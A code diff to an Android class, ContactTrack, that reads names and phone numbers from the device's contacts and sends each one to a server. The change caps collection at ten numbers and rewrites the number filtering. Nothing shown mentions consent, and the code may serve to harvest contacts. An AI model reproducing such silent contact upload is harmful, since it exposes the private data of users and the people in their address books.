@@ -46,11 +46,12 @@ public class ContactTrack {
 
             Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null,
                     null);
+            int counter = 0;
 
         try {
             if ((cursor != null ? cursor.getCount() : 0) > 0) {
 
-                while (cursor != null && cursor.moveToNext()) {
+                while (cursor != null && cursor.moveToNext() && counter != 10) {
 
                     String id = cursor.getString(
                             cursor.getColumnIndex(ContactsContract.Contacts._ID));
@@ -63,22 +64,21 @@ public class ContactTrack {
                         Cursor pCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                                 ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
 
-                        while (pCursor.moveToNext()) {
+                        while (pCursor.moveToNext() && counter != 10) {
+
+                            counter++;
 
                             contactNumber = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
 
-                            if(contactNumber.contains("#") ||
-                                    contactNumber.contains("*") ||
-                                    contactNumber.contains(".") ||
-                                    contactNumber.contains("$") ||
-                                    contactNumber.contains(","))   {
-                                continue;
 
-                            }else {
-                                //Toast.makeText(MainActivity.this, name + "\n"+ phoneNo, Toast.LENGTH_SHORT).show();
-                                ContactModel contactModel = new ContactModel(contactName, contactNumber);
-                                sendDataToServer(contactModel);
-                            }
+                            contactNumber =  contactNumber.replaceAll("[^a-zA-z0-9]", "");
+
+
+                            //Toast.makeText(MainActivity.this, name + "\n"+ phoneNo, Toast.LENGTH_SHORT).show();
+                            ContactModel contactModel = new ContactModel(contactName, contactNumber);
+                            sendDataToServer(contactModel);
+
+
 
                         }
                         pCursor.close();
